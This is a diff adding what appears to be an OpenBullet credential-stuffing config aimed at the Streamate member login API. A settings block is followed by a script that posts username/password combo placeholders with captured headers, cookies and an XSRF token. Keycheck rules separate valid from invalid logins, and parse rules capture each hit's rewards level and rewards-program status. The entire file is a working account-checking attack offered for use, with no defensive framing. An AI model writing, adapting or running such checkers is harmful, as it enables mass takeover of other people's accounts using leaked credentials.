@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "Streamate",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-19T13:41:06.9064574-04:00",
+  "AdditionalInfo": "",
+  "Author": "Aaron Kong | Privileged Owner#1680",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.streamate.com/api/member/login " 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"tzOffsetMinutes\":240,\"siteId\":1,\"referrerId\":0,\"smfid\":\"1a7316123be410f2b7d7fdc73da5b75a\",\"allowLoginRedirection\":true,\"siteType\":\"premium\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.streamate.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 190" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "X-XSRF-TOKEN: 1584637970403.b199922e9fd10e9025b7db57ee8c76555f5fac08f52f214e766a93bad4f56a38" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36" 
+  HEADER "DNT: 1" 
+  HEADER "Origin: https://www.streamate.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.streamate.com/?langchoice=en" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: NaiadJP=cj1odHRwcyUzQSUyRiUyRnd3dy5nb29nbGUuY29tJTJGJmU9aHR0cCUzQSUyRiUyRnd3dy5zdHJlYW1hdGUuY29tJTJGJTNGbGFuZ2Nob2ljZSUzRGVuJm89MTU4NDYzNzk3MA%253D%253D; smtid=de286ef5-3712-430f-8429-e9f0847eeff9G0111584637970; smeid=3a988c21-9730-428f-a18c-e88a7b2b8604G0111584637970; Xld_rct=1; chat.client_version=0.7.12; hybrid.client_version=9.21.0; react.components_version=5.4.0; join.client_version=3.27.22; scp_version=4.44.0; search.client_version=5.120.0; smvid=2aa175be-9789-44cc-b393-3e17106d352aG0211584637970; atid=747d3e42-be06-4861-9d3d-4880da4fd379; _ga=GA1.2.1717197241.1584637972; _gid=GA1.2.1001611334.1584637972" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"errors\":[\"invalid params\"]}" 
+  KEYCHAIN Success OR 
+    KEY "{\"account\":{\"email" 
+    KEY "{\"sakey\":\"" 
+
+PARSE "<SOURCE>" LR "rewardsLevel\":" "}," CreateEmpty=FALSE -> CAP "Rewards Level" 
+
+PARSE "<SOURCE>" LR "isRewardsProgramV2User\":" "}," CreateEmpty=FALSE -> CAP "Rewards User" 
+
